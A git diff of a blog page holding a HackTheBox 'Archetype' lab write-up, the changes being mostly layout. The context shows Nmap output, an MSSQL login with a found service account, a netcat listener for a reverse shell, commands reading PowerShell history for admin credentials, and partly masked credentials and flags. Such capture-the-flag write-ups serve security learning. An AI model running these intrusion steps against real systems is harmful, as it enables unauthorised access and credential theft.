@@ -7,7 +7,7 @@
     <meta content="width=device-width, initial-scale=1" name="viewport"/>
     <title>मंथन | Manthan</title>
     <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
-    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.rainbow.css"/>
+    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.invisibletree.css"/>
     <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
     <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
     <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
@@ -20,23 +20,13 @@
     <script charset="UTF-8" src="/static/js/go.min.js"></script>
    </head>
   <body>
-    <div class="header">
-      <span class="menu_left"><a class="menu_home" href="/index.html">मंथन</a></span>
-      <span class="menu_right"><table>
-        <tr>
-          <td><a class="menu_archive" href="/archive.html">Archive</a></td><td>|</td>
-          <td><a class="menu_tags" href="/tags.html">Tags</a></td><td>|</td>
-          <td><a class="menu_stats" href="/stats.html">Stats</a></td>
-        </tr>
-      </table></span>
-      <br/><br/>
-    </div>
     <div class="body">
-      <h1 class="h1 collapsible" onclick="toggle(this);">[HackTheBox] Archetype</h1>
+      <div class="content">
+          <h1 class="h1 collapsible" onclick="toggle(this);">[HackTheBox] Archetype</h1>
           <p style="float:left;"><a href="/posts/20191113_htb-shocker.html"> « </a>📅 published on <code>28/Apr/2020</code><a href="/posts/20200625_htb-bashed.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested"><img alt="writeup.metadata.infocard" src="/static/files/posts_htb_archetype/infocard.png.webp" /></p>
 <p class="nested">This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/start">Archetype</a>.</p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -45,7 +35,7 @@
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>445/tcp/microsoft-ds/Windows Server 2019 Standard 17763 microsoft-ds</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_smb">enumerate_proto_smb</a>, <a href="https://github.com/7h3rAm/writeups#enumerate_proto_smb_anonymous_access">enumerate_proto_smb_anonymous_access</a>, <a href="https://github.com/7h3rAm/writeups#privesc_psexec_login">privesc_psexec_login</a><br />
 2. <code>1433/tcp/ms-sql-s/Microsoft SQL Server 14.00.1000.00</code>: <a href="https://github.com/7h3rAm/writeups#enumerate_proto_sql">enumerate_proto_sql</a>, <a href="https://github.com/7h3rAm/writeups#enumerate_proto_sql_ssis_dtsconfig">enumerate_proto_sql_ssis_dtsconfig</a>, <a href="https://github.com/7h3rAm/writeups#enumerate_app_powershell_history">enumerate_app_powershell_history</a>, <a href="https://github.com/7h3rAm/writeups#exploit_sql_login">exploit_sql_login</a>, <a href="https://github.com/7h3rAm/writeups#exploit_sql_xpcmdshell">exploit_sql_xpcmdshell</a>  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Tue Apr 28 07:55:10 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.archetype/results/10.10.10.27/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.archetype/results/10.10.10.27/scans/xml/_quick_tcp_nmap.xml 10.10.10.27
 Increasing send delay for 10.10.10.27 from 0 to 5 due to 32 out of 106 dropped probes since last increase.
@@ -168,7 +158,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
 <pre class="nested"><code>sql: sql_svc
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. Since the <code>1443/tcp</code> port is open for SQL service and we also have credentials for the default user, let's connect to the remote service and explore further:  </p>
 <pre class="nested"><code>mssqlclient.py -windows-auth &quot;sql_svc@10.10.10.27&quot;
 </code></pre>
@@ -201,7 +191,7 @@ nc -nlvp 443
 <pre class="nested"><code>type C:\Users\sql_svc\Desktop\user.txt
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.5.1" src="/static/files/posts_htb_archetype/screenshot10.png.webp" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>sql_svc@ARCHETYPE&gt; id
 archetype\sql_svc
 sql_svc@ARCHETYPE&gt;  
@@ -226,7 +216,7 @@ sql_svc@ARCHETYPE&gt; users
 sql_svc
 Administrator
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. With our interactive shell running, we can now begin exploring the system further. Since the current user is a normal as well as service account, let's look at the Powershell history file to find any interesting commands:  </p>
 <pre class="nested"><code>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 </code></pre>
@@ -239,7 +229,7 @@ Administrator
 <pre class="nested"><code>type C:\Users\Administrator\Desktop\root.txt
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_htb_archetype/screenshot13.png.webp" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
 <pre class="nested"><code>ssh: administrator/MEGACORP_4......
 sql: sql_svc/M3g4c0r....
@@ -248,21 +238,64 @@ sql: sql_svc/M3g4c0r....
 <pre class="nested"><code>C:\Users\sql_svc\Desktop\user.txt: 3e7b102e78218e935bf.............
 C:\Users\Administrator\Desktop\root.txt: b91ccec3305e982400..............
 </code></pre>
-<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.hackthebox.eu/home/start">https://www.hackthebox.eu/home/start</a>  </li>
 </ul>
+    <hr>
           <p style="float:left;">« <a href="/posts/20191113_htb-shocker.html">[HackTheBox] Shocker</a> «</p>
       <p style="float:right;">» <a href="/posts/20200625_htb-bashed.html">[HackTheBox] Bashed</a> »</p>
-        </div>
-    <div BG_CLIPART_STYLE_HERE></div>
-    <div class="footer footercenter">
-      <span>
-        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
-      </span>
+          </div>
+      <div class="menu">
+        <h1 class="h1"><a class="menu_home" href="/index.html">मंथन</a></h1>
+          <ul class="active nested">
+            <li><a class="menu_archive" href="/archive.html">💾 Archive</a><ul class="active nested">
+              <li><a href=/pages/research.html>🔬 Research</a></li>
+              <li><a href=/pages/cv.html>📄 Curriculum Vitae</a></li>
+              <li><a href=/pages/satview.html>🛰️ Satellite Views</a></li>
+              <li><a href=/pages/fitness.html>🏋️ Fitness</a></li>
+              <li><a href=/pages/life.html>🧘 Life</a></li>
+            </ul></li>
+            <li><a class="menu_tags" href="/tags.html">🔖 Tags</a><ul class="active nested">
+                            <li><a href="/tags.html#code">code</a></li>
+                            <li><a href="/tags.html#ctf">ctf</a></li>
+                            <li><a href="/tags.html#exploit">exploit</a></li>
+                            <li><a href="/tags.html#hackthebox">hackthebox</a></li>
+                            <li><a href="/tags.html#reversing">reversing</a></li>
+                            <li><a href="/tags.html#tryhackme">tryhackme</a></li>
+                            <li><a href="/tags.html#vulnhub">vulnhub</a></li>
+                            <li><a href="/tags.html#vulnweekends">vulnweekends</a></li>
+                            <li><a href="/tags.html#writeup">writeup</a></li>
+                          </ul></li>
+            <li><a class="menu_stats" href="/stats.html">📊 Stats</a></li>
+          </ul>
+      </div>
+      <div class="footer footercenter"><span><a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a></span></div>
+      <script>hljs.initHighlightingOnLoad();</script>
+      <script>hljs.initLineNumbersOnLoad();</script>
+      <script>
+        function toggle(s){
+          s.classList.toggle("expanded");
+          var t=!1,i=!1,a=!1;
+          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
+          for(var l=s.nextElementSibling;l;){
+            if(t&&l.classList.contains("h2")){
+              l.classList.toggle("active");
+              break
+            }
+            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
+              l.classList.toggle("active");
+              break
+            }
+            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
+              l.classList.toggle("active");
+              break
+            }
+            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
+          }
+        }
+      </script>
     </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
+    <div id="bgclipart"></div>
   </body>
 </html>
